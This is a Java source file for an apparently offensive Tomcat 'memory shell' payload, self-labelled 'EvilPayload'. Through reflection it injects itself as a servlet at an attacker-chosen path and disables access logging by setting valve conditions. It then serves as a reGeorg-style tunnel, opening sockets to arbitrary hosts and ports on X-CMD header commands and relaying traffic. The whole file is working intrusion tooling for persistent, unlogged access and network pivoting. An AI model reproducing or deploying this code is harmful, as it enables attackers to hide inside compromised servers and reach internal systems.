package x;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.JspWriter;
import javax.servlet.jsp.PageContext;
import javax.servlet.jsp.SkipPageException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;

/**
 * @className EvilPayload
 * @Description TODO
 * @Author sunnylast0
 * @Date 2020/10/19 0:28
 * @Version 1.0
 **/
public class RegeogTomServlet implements Servlet {
    private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();
    private String path;
    private ServletConfig servletConfig;

    public RegeogTomServlet() {

    }


    public void init(ServletConfig paramServletConfig) throws ServletException {
        this.servletConfig = paramServletConfig;
    }

    public ServletConfig getServletConfig() {
        return this.servletConfig;
    }

    // init
    @Override
    public boolean equals(Object conreq) {
        Request request = (Request) conreq;
        Response response = request.getResponse();
        try {
            this.path = request.getParameter("path");
            ServletContext servletContext = request.getServletContext();
            if (this.path != null && servletContext != null) {
                dynamicAddServlet(servletContext);
                response.getWriter().write("dynamic inject success");
                response.getWriter().flush();
                response.getWriter().close();
            } else {
                response.getWriter().write("dynamic inject Fail");
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (Exception e) {
            try {
                StackTraceElement[] stackTraceElementArray = e.getStackTrace();
                StringBuffer sb = new StringBuffer();
                for (StackTraceElement stackTraceElement : stackTraceElementArray) {
                    sb.append(stackTraceElement.toString()).append("\n");
                }
                response.getWriter().write(sb.toString());
                response.getWriter().flush();
                response.getWriter().close();
            } catch (IOException ioException) {
                ;
            }
        }
        return true;
    }

    public void service(ServletRequest arg0, ServletResponse arg1) throws ServletException, IOException {
        HttpServletRequest request;
        HttpServletResponse response;
        try {
            request = (HttpServletRequest) arg0;
            response = (HttpServletResponse) arg1;
        } catch (ClassCastException var6) {
            throw new ServletException("non-HTTP request or response");
        }

        this._jspService(request, response);
    }

    private void noLog(PageContext pc) {
        try {
            Object applicationContext = getFieldValue(pc.getServletContext(), "context");
            Object container = getFieldValue(applicationContext, "context");

            ArrayList arrayList;
            for (arrayList = new ArrayList(); container != null; container = this.invoke(container, "getParent", (Object[]) null)) {
                arrayList.add(container);
            }

            label51:
            for (int i = 0; i < arrayList.size(); ++i) {
                try {
                    Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[]) null);
                    if (pipeline != null) {
                        Object valve = this.invoke(pipeline, "getFirst", (Object[]) null);

                        while (true) {
                            while (true) {
                                if (valve == null) {
                                    continue label51;
                                }

                                if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[]) null) != null && this.getMethodByClass(valve.getClass(), "setCondition", String.class) != null) {
                                    String condition = (String) this.invoke(valve, "getCondition");
                                    condition = condition == null ? "FuckLog" : condition;
                                    this.invoke(valve, "setCondition", condition);
                                    pc.getRequest().setAttribute(condition, condition);
                                    valve = this.invoke(valve, "getNext", (Object[]) null);
                                } else if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                    valve = this.invoke(valve, "getNext", (Object[]) null);
                                } else {
                                    valve = null;
                                }
                            }
                        }
                    }
                } catch (Exception var9) {
                }
            }
        } catch (Exception var10) {
        }

    }

    public void _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        HttpSession session = null;
        JspWriter out = null;
        JspWriter _jspx_out = null;
        PageContext _jspx_page_context = null;

        try {
            response.setContentType("text/html");
            PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String) null, true, 8192, true);
            _jspx_page_context = pageContext;
            ServletContext application = pageContext.getServletContext();
            ServletConfig config = pageContext.getServletConfig();
            session = pageContext.getSession();
            out = pageContext.getOut();
            this.noLog(pageContext);
            String cmd = request.getHeader("X-CMD");
            if (cmd != null) {
                response.setHeader("X-STATUS", "OK");
                int readlen;
                if (cmd.compareTo("CONNECT") == 0) {
                    try {
                        String target = request.getHeader("X-TARGET");
                        readlen = Integer.parseInt(request.getHeader("X-PORT"));
                        SocketChannel socketChannel = SocketChannel.open();
                        socketChannel.connect(new InetSocketAddress(target, readlen));
                        socketChannel.configureBlocking(false);
                        session.setAttribute("socket", socketChannel);
                        response.setHeader("X-STATUS", "OK");
                    } catch (UnknownHostException var25) {
                        System.out.println(var25.getMessage());
                        response.setHeader("X-ERROR", var25.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    } catch (IOException var26) {
                        System.out.println(var26.getMessage());
                        response.setHeader("X-ERROR", var26.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    }
                } else {
                    SocketChannel socketChannel;
                    if (cmd.compareTo("DISCONNECT") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            socketChannel.socket().close();
                        } catch (Exception var24) {
                            System.out.println(var24.getMessage());
                        }

                        session.invalidate();
                    } else if (cmd.compareTo("READ") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            ByteBuffer buf = ByteBuffer.allocate(512);
                            int bytesRead = socketChannel.read(buf);

                            ServletOutputStream so;
                            for(so = response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                                so.write(buf.array(), 0, bytesRead);
                                so.flush();
                                buf.clear();
                            }

                            response.setHeader("X-STATUS", "OK");
                            so.flush();
                            so.close();
                        } catch (Exception var28) {
                            System.out.println(var28.getMessage());
                            response.setHeader("X-ERROR", var28.getMessage());
                            response.setHeader("X-STATUS", "FAIL");
                        }
                    } else if (cmd.compareTo("FORWARD") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            readlen = request.getContentLength();
                            byte[] buff = new byte[readlen];
                            request.getInputStream().read(buff, 0, readlen);
                            ByteBuffer buf = ByteBuffer.allocate(readlen);
                            buf.clear();
                            buf.put(buff);
                            buf.flip();

                            while(buf.hasRemaining()) {
                                socketChannel.write(buf);
                            }

                            response.setHeader("X-STATUS", "OK");
                        } catch (Exception var27) {
                            System.out.println(var27.getMessage());
                            response.setHeader("X-ERROR", var27.getMessage());
                            response.setHeader("X-STATUS", "FAIL");
                            socketChannel.socket().close();
                        }
                    }
                }
            } else {
                out.print("Georg says, 'All seems fine'");
            }
        } catch (Throwable var18) {
            if (!(var18 instanceof SkipPageException)) {
                out = (JspWriter) _jspx_out;
                if (_jspx_out != null && ((JspWriter) _jspx_out).getBufferSize() != 0) {
                    try {
                        if (response.isCommitted()) {
                            out.flush();
                        } else {
                            out.clearBuffer();
                        }

                        return;
                    } catch (IOException var17) {
                        return;
                    }
                }
            }

            return;
        } finally {
            _jspxFactory.releasePageContext(_jspx_page_context);
        }

    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public void dynamicAddServlet(ServletContext servletContext) throws Exception {
        String wrapperName = this.path;

        // get standardContext
        ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
        Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
        applicationContextField.setAccessible(true);

        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);
        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        standardContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

        Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[]) null);
        this.invoke(newWrapper, "setName", wrapperName);
        setFieldValue(newWrapper, "instance", this);
        Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
        Object oldWrapper = this.invoke(standardContext, "findChild", wrapperName);
        if (oldWrapper != null) {
            standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
        }

        standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);

        Method method;
        try {
            method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
        } catch (Exception var9) {
            method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
        }

        method.invoke(standardContext, path, wrapperName);

        this.init((ServletConfig) getFieldValue(newWrapper, "facade"));
    }


    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }

        f.setAccessible(true);
        f.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }

    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }
}
